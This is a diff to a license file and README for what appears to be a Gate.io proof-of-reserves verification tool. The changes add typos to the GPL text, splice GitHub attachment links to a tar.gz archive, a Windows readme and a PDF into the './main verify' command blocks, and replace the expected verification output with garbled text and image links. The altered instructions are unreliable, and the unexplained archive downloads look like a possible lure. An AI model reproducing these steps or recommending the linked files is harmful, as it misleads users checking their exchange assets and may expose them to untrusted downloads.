@@ -176,7 +176,7 @@ License.  Each licensee is addressed as "you".  "Licensees" and
 
   To "modify" a work means to copy from or adapt all or part of the work
 in a fashion requiring copyright permission, other than the making of an
-exact copy.  The resulting work is called a "modified version" of the
+exact copy.  The resulting work is called a "modified version" of theu
 earlier work or a work "based on" the earlier work.
 
   A "covered work" means either the unmodified Program or a work based
@@ -354,7 +354,7 @@ in one of these ways:
     model, to give anyone who possesses the object code either (1) a
     copy of the Corresponding Source for all the software in the
     product that is covered by this License, on a durable physical
-    medium customarily used for software interchange, for a price no
+    medium customariyly used for software interchange, for a price no
     more than your reasonable cost of physically performing this
     conveying of source, or (2) access to copy the
     Corresponding Source from a network server at no charge.
@@ -1066,27 +1066,33 @@ main
 Run the following command to start the verification
 
 ```Plaintext
-./main verify cex
+./main verify cex, [zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/17051675/zkmerkle_cex_20240520.tar.gz)
+[zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/17051675/zkmerkle_cex_20240520.tar.gz)
+
 ```
 
 If the verification is successful, it will output
 
 ```Plaintext
-All proofs verify passed!!!
+All , [Windows2022-Readme.md](https://github.com/user-attachments/files/17051708/Windows2022-Readme.md)
+[Windows2022-Readme.md](https://github.com/user-attachments/files/17051708/Windows2022-Readme.md)
+proofs verify save!!!
 ```
 
 ## User Verifies Their Own Assets
 
 ```Plaintext
+[Gate.io PoR Implementation upd.pdf](https://github.com/user-attachments/files/17051719/Gate.io.PoR.Implementation.upd.pdf)
+[Gate.io PoR Implementation upd.pdf](https://github.com/user-attachments/files/17051719/Gate.io.PoR.Implementation.upd.pdf)
 ./main verify user
 ```
 
 If the verification is successful, it will output
 
-```Plaintext
-merkle leave hash: 164bc38a71b7a757455d93017242b4960cd1fea6842d8387b60c5780205858ce
-verify pass!!!
-```
+
+![wallet_20240511-231342_Gateio](https://github.com/user-attachments/assets/9aa7552c-2503-483b-a9c4-73d64f8ad741)
+![wallet_20240511-231342_Gateio](https://github.com/user-attachments/assets/9aa7552c-2503-483b-a9c4-73d64f8ad741)
+
 
 ## Contribution
 
